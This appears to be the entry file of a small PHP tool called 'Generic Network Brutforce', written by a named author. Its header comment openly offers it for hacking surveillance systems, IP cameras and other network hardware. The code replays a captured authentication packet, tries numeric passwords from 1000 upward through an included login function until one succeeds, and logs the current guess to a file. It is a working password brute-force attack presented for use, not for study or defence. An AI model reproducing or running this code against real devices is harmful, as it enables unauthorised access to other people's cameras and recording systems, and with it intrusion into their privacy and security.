//*****************************************************************************
//  Generic Network Brutforce 
//*****************************************************************************
//  file: index.php
//        this file is part of Generic Network Brutforce
//*****************************************************************************
//    This is simplest brutforce code written in PHP. With this code you can
//  hack surviliance systems, IP cameras or other network hardware. 
//  Тhrough Wireshark with given wireshark filter you can log authentication
//  communication with the host.
//    login_data_1020.raw file is the hex data of authentication with login and 
//  password. In this code we changing in authentication message the password
//  and send to the host until authentication succeed. All is simple :)
//*****************************************************************************
//  Author: Ara Khachatryan 
//*****************************************************************************

<?php

	include_once "tcp_login.php";
	
	define( "LOGIN_RAW_DATA", file_get_contents("login_data_1020.raw") );
	
 	$password = 1000;
 	
 	while( !dvr_login( $password ) ){
		file_put_contents("password.txt", $password);
		$password++;		
	}

	file_put_contents("password.txt", $password);
 
?>
